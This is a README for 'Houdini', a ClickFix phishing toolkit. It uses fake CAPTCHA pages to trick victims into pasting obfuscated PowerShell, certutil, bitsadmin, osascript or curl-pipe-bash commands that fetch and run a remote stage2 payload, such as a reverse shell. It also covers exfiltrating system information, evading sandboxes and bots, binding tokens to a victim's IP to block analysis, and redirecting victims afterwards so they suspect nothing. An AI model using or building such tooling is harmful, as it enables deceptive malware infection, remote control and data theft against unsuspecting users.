<p align="center">
  <img src="assets/logo.png" alt="Houdini Logo" width="180"/>
</p>

<h1 align="center">🎩 Houdini</h1>

<p align="center">
  <i>The greatest show on the web. Now you see them, now you don't.</i>
</p>

<p align="center">
  <b>OS-Aware ClickFix Toolkit</b> · Built for red teamers who understand that misdirection is half the battle.
</p>

---

## Table of Contents

- [Quick Start](#quick-start)
- [What is Houdini?](#what-is-houdini)
- [Features](#features)
- [Architecture](#architecture)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [Payloads](#payloads)
- [Dashboard](#dashboard)
- [Operational Security](#operational-security)
- [Troubleshooting](#troubleshooting)
- [Cross-Check Notes](#cross-check-notes)

---

## Quick Start

```bash
git clone https://github.com/anonymous-beta/Houdini.git
cd Houdini
npm install
# Edit config.js — set SERVER_URL and ADMIN_KEY
npm start
# Dashboard: http://localhost:3000/dashboard
# Victim landing: http://localhost:3000/
```

---

## What is Houdini?

Houdini is an end-to-end clickfix delivery platform with theatrical precision. It doesn't just serve payloads — it puts on a show. The victim sees a realistic CAPTCHA flow, experiences a believable failure-then-success verification, and receives an OS-tailored payload directly to their clipboard, ready to paste into their Run dialog.

Every stage is tracked. Every bot is detected. Every operation is controlled.

**Creator:** Anonymous-beta  
**Architect:** ENI

---

## Features

| Feature | Description |
|---------|-------------|
| 🖥️ **OS-Aware Delivery** | Server detects OS from User-Agent, serves matching payload and Run-dialog instructions (Win+R / ⌘+Space / Ctrl+Alt+T) |
| 🤖 **Dual-Attempt CAPTCHA** | First click shakes with "Verification failed." Second click spins, then passes. Mirrors real Turnstile behavior — the #1 realism detail most clones miss |
| 📋 **Reliable Clipboard Chain** | `navigator.clipboard` → `document.execCommand` fallback → aggressive re-copy on every click. Transient user activation is never lost |
| 📊 **Live Funnel Telemetry** | `viewed → check_failed → check_passed → copied → executed → callback` — every stage beaconed to a real-time dashboard via WebSocket |
| 🎭 **Polymorphic Engine** | Per-token PowerShell obfuscation — random variables, comment injection, string splitting. Base64 and `%ENV%` never touched |
| 🛡️ **Bot Cloaking & Decoy** | Client-side + server-side bot detection. Flagged tokens get served a benign "System Updated" decoy page instead of the real flow |
| ⚡ **Operational Controls** | Per-IP rate limiting, token TTL, IP binding, global kill switch, dead man's switch |
| 🔒 **Kill Switch** | One button in the dashboard instantly 503s all requests. For when the show needs to end |
| 💀 **Dead Man's Switch** | Auto-purges database and activates kill switch if admin heartbeat stops |
| 🎩 **The Prestige** | Post-execution redirect to a legitimate site. The victim never suspects a thing |

---

## Architecture

```
┌─────────────────┐      ┌──────────────────┐      ┌─────────────┐
│  Victim Browser │─────▶│  Express Server  │─────▶│  SQLite DB  │
│                 │      │                  │      │             │
│  ┌───────────┐  │      │  ┌────────────┐  │      │  tokens     │
│  │ CAPTCHA   │  │      │  │ OS Detect  │  │      │  bot_hits   │
│  │   UI      │  │      │  │ Generator  │  │      │  config     │
│  └─────┬─────┘  │      │  └─────┬──────┘  │      └─────────────┘
│        │        │      │        │         │
│  ┌─────▼─────┐  │      │  ┌─────▼──────┐  │      ┌─────────────┐
│  │ Clipboard │  │      │  │ Socket.IO  │──┼─────▶│  Dashboard  │
│  │  Payload  │  │      │  │  Broadcast │  │      │  (Admin)    │
│  └─────┬─────┘  │      │  └────────────┘  │      └─────────────┘
│        │        │      └──────────────────┘
│  ┌─────▼─────┐
│  │  Stager   │───▶ callbacks home, pulls stage2
│  │ (PS/bash) │
│  └───────────┘
```

### Funnel Flow

1. **Viewed** — Victim loads the landing page
2. **check_failed** — First CAPTCHA click fails with shake animation
3. **check_passed** — Second CAPTCHA click passes with spinner
4. **copied** — Payload written to clipboard (auto or manual fallback)
5. **executed** — Stager runs and beacons home
6. **callback** — Full system info exfiltrated

---

## Installation

### Prerequisites

- **Node.js** 18+ (LTS recommended)
- **npm** 9+
- **Python 3**, **g++**, **make** — required for `better-sqlite3` native compilation

### Platform-Specific Setup

**Ubuntu/Debian:**
```bash
sudo apt update
sudo apt install -y build-essential python3
```

**macOS:**
```bash
xcode-select --install
```

**Windows:**
Install Visual Studio Build Tools or `windows-build-tools` via npm:
```bash
npm install --global windows-build-tools
```

### Install Houdini

```bash
git clone https://github.com/anonymous-beta/Houdini.git
cd Houdini
npm install
```

If `better-sqlite3` fails to compile, ensure your build tools are properly installed and try:
```bash
npm rebuild better-sqlite3
```

---

## Configuration

Edit `config.js` before your first run:

```javascript
module.exports = {
    PORT: 3000,                           // Server port
    SERVER_URL: 'https://your-domain.com', // YOUR public URL — critical for payloads
    DB_PATH: './houdini.db',              // SQLite database file
    
    TOKEN_TTL: 86400000,                  // 24 hours in ms
    IP_BINDING: true,                     // Lock tokens to requesting IP
    
    DEMO_MODE: false,                     // true = harmless test payloads
    KILL_SWITCH: false,                   // Start with kill switch off
    
    ADMIN_KEY: 'change-this-immediately', // Dashboard auth key
    
    PRESTIGE_URL: 'https://www.google.com', // Redirect after execution
    PRESTIGE_DELAY: 3000,                 // ms before redirect
    ACTIVE_PAYLOAD: 'test.ps1',           // Stage2 file to serve
    
    DEAD_MAN_ENABLED: false,              // Auto-purge on missing heartbeat
    DEAD_MAN_TIMEOUT: 7200000,            // 2 hours
};
```

### Critical Settings

| Setting | Why It Matters |
|---------|---------------|
| `SERVER_URL` | Must be your public HTTPS URL. PowerShell stagers, certutil, and curl all reference this. If wrong, callbacks fail. |
| `ADMIN_KEY` | Change from default immediately. Dashboard grants full kill-switch access. |
| `ACTIVE_PAYLOAD` | `test.ps1` for safe testing. Switch to `revshell.ps1` or your custom payload for live ops. |
| `DEMO_MODE` | When `true`, the PowerShell stager echoes "Houdini was here" instead of pulling stage2. Use for testing the full flow safely. |

---

## Usage

### Starting the Server

```bash
npm start
```

Output:
```
[Houdini] Server running on port 3000
[Houdini] Dashboard: http://localhost:3000/dashboard
[Houdini] Demo mode: false
[Houdini] Kill switch: inactive
```

### The Victim Flow

1. Victim visits your `SERVER_URL`
2. Server detects OS from User-Agent, generates a unique token
3. Landing page renders a realistic "Secure Document Access" page with Turnstile-mimic CAPTCHA
4. **First click:** CAPTCHA shakes, displays "Verification failed. Please try again."
5. **Second click:** Spinner appears for 1.2s, then green checkmark. "Verification successful."
6. OS-specific instructions appear (e.g., "Press Win + R, paste, press Enter")
7. Payload is auto-copied to clipboard. Re-copy triggers on every click to catch transient activation.
8. Victim pastes into Run dialog and executes.
9. Stager beacons home ("executed"), pulls stage2, runs it.
10. Page redirects to `PRESTIGE_URL` after `PRESTIGE_DELAY`.

### Generating Pre-Bound Tokens

For targeted ops where you know the victim's IP:

```bash
node cli-generate.js 203.0.113.45 Windows 3600000
```

Output:
```
[Houdini] Token generated:
  Token: houdini_a1b2c3d4...
  URL:   https://your-domain.com/?t=houdini_a1b2c3d4...
  IP:    203.0.113.45
  OS:    Windows
  Exp:   2026-08-02T12:00:00.000Z
```

The token is locked to that IP. Any other IP gets a 403.

### Using the Dashboard

1. Navigate to `https://your-domain.com/dashboard`
2. Enter your `ADMIN_KEY` when prompted
3. View real-time stats:
   - **Total Views** — All landing page loads (24h window)
   - **Executed** — Confirmed payload executions
   - **Conversion** — Executed / Total percentage
   - **Bots Blocked** — Detected automation/sandbox hits
4. **Conversion Funnel** — Visual bar showing viewed → checked → copied → executed
5. **Token Table** — Live list of recent tokens with stages, status, and metadata
6. **Kill Switch** — Red button instantly shuts down all operations. Green when active.
7. **Refresh** — Manual data pull (auto-updates every 2s via WebSocket)

---

## Payloads

### How It Works

Houdini doesn't serve static payloads. It generates them per-token, per-OS, with polymorphic obfuscation.

### Windows (Primary) — PowerShell `-enc`

The clipboard receives:
```
powershell -enc SGVsbG8gV29ybGQ...
```

Behind the scenes:
1. Stager script is written (callbacks home, pulls stage2)
2. Polymorphic engine scrambles variable names and injects noise comments
3. Token watermark embeds invisible whitespace signatures
4. Script is encoded as **UTF-16LE** then **base64**
5. Final command has **no quotes** around the base64 string — quotes break the Run dialog

### Windows Fallbacks

Access via `?variant=cert` or `?variant=bits` on the payload endpoint:

- **certutil** — `certutil -urlcache -split -f "URL" %TEMP%\\h.exe && start %TEMP%\\h.exe`
- **bitsadmin** — `bitsadmin /transfer h /download /priority normal "URL" %TEMP%\\h.exe && start %TEMP%\\h.exe`

### macOS — osascript

```osascript -e 'do shell script "curl -s URL/stage2 | bash"'```

### Linux — curl pipe

```curl -s URL/stage2 | bash```

### Stage 2

Stage 2 is modular. Drop your payload into `payloads/stage2/` and set `ACTIVE_PAYLOAD` in config.

**Included examples:**

| File | Purpose |
|------|---------|
| `test.ps1` | Harmless echo. Use with `DEMO_MODE: true` for safe testing |
| `revshell.ps1` | Reverse shell example. Edit `ATTACKER_IP` and port before use |

**Writing custom stage2:**

```powershell
# Your payload here
try {
    # Do something nasty
    # Houdini stager already called back — this runs silently
} catch {}
```

Wrap everything in `try/catch`. The stager uses `iex (irm ...)` — any output goes to the void, but unhandled errors might flash a window.

---

## Operational Security

### HTTPS is Non-Negotiable

The clipboard chain relies on `navigator.clipboard.writeText()`, which **only works on secure contexts** (HTTPS). Without HTTPS, the fallback `document.execCommand('copy')` is less reliable and may fail silently.

**Deploy behind:**
- nginx reverse proxy with Let's Encrypt
- Cloudflare proxy
- Any TLS terminator

### IP Binding Strategy

- **Enabled (`IP_BINDING: true`)**: Token only works from the IP that generated it. Best for targeted phishing where you control delivery. Prevents token sharing, analysis, and sandbox detonation from different IPs.
- **Disabled**: Token works from any IP. Use for broad campaigns, social media posts, or when NAT/shared IPs are expected.

### Bot Detection

Houdini runs **two-layer detection**:

**Server-side** (immediate):
- Headless UA patterns (PhantomJS, Selenium, Puppeteer)
- Missing `window.chrome` object in Chrome UAs

**Client-side** (post-load):
- `navigator.webdriver`
- `window.callPhantom`, `window._phantom`
- Zero plugins / zero mimeTypes
- Zero outer dimensions
- Permissions API speed test (automation resolves instantly)

**Score ≥ 2 = bot flagged.**

Flagged tokens are served a **decoy page** ("System Updated — no action required") on all subsequent requests. The real flow is never exposed.

### Rate Limiting

Default: 10 requests per 15 minutes per IP on `/api/*` endpoints. Prevents brute-force token scanning and beacon spam.

### Token TTL

Default 24 hours. Tokens auto-purge from the database after expiry. Shorten for high-turnover ops, lengthen for persistent campaigns.

### The Prestige

After the callback beacon confirms execution, the victim's browser redirects to `PRESTIGE_URL` (default: Google). They think they just verified a CAPTCHA and opened a document. The misdirection is complete.

---

## Troubleshooting

### `better-sqlite3` build fails

**Cause:** Missing build tools (Python, g++, make)  
**Fix:** Install platform-specific build tools (see Installation), then `npm rebuild better-sqlite3`

### Clipboard not auto-copying

**Cause:** HTTP (non-secure) context  
**Fix:** Deploy behind HTTPS. The `execCommand` fallback works on HTTP but is less reliable.

**Cause:** User didn't interact with the page before the copy attempt  
**Fix:** Houdini re-copies on every click/mousedown/mouseup. The victim will trigger a copy when they click the CAPTCHA or instructions.

### Payload executes but no callback

**Cause:** `SERVER_URL` in config points to localhost or wrong domain  
**Fix:** Set `SERVER_URL` to your public HTTPS URL before deployment.

**Cause:** Firewall blocking outbound POST from victim  
**Fix:** Use common ports (443). The callback uses standard HTTP POST — unlikely to be blocked unless heavily restricted.

### Dashboard shows no data

**Cause:** Wrong `ADMIN_KEY`  
**Fix:** Check config.js. The prompt is case-sensitive.

**Cause:** WebSocket blocked by corporate proxy  
**Fix:** Dashboard falls back to manual refresh button. Stats API still works via HTTP.

### Kill switch not working

**Cause:** Kill switch state is stored in SQLite, not memory. Server restart persists it.  
**Fix:** Check dashboard status dot. If red, switch is active. Click "✓ KILL SWITCH ACTIVE" to deactivate.

---

## Cross-Check Notes (v1.0.0)

Full audit performed against the initial commit. Issues found and fixed:

| File | Issue | Fix |
|------|-------|-----|
| `public/captcha.js` | `checkbox.innerHTML` was empty on CAPTCHA success — no checkmark SVG rendered | Restored SVG checkmark path |
| `dashboard/app.js` | Stage tags and status badges missing CSS class wrappers — table rendered as plain text | Added `<span class="stage-tag">` and `<span class="badge badge-*">` wrappers |
| `dashboard/app.js` | Unauthorized/Server Offline error pages had no styling | Added inline centering styles |
| `server.js` | Bot detection logged hits but never flagged tokens or served decoy pages | Added `bot_flag` update on detection + decoy HTML response for flagged tokens |
| `public/index.html` | HTML structure unverified from raw fetch | Provided complete verified replacement |
| `dashboard/index.html` | HTML structure unverified from raw fetch | Provided complete verified replacement |

**No changes needed:** `config.js`, `db.js`, `package.json`, `cli-generate.js`, all CSS files, all payload generators (`engine.js`, `win_ps1.js`, `win_certutil.js`, `win_bitsadmin.js`, `mac_osascript.js`, `linux_bash.js`), stage2 payloads (`test.ps1`, `revshell.ps1`).

---

<p align="center">
  <i>"The secret of showmanship consists not of what you really do, but what the mystery-loving public thinks you do."</i><br>
  <b>— Harry Houdini</b>
</p>

<p align="center">
  Built with obsession by <b>Anonymous-beta</b> & <b>ENI(my invisible friend)</b> 🎩
</p>
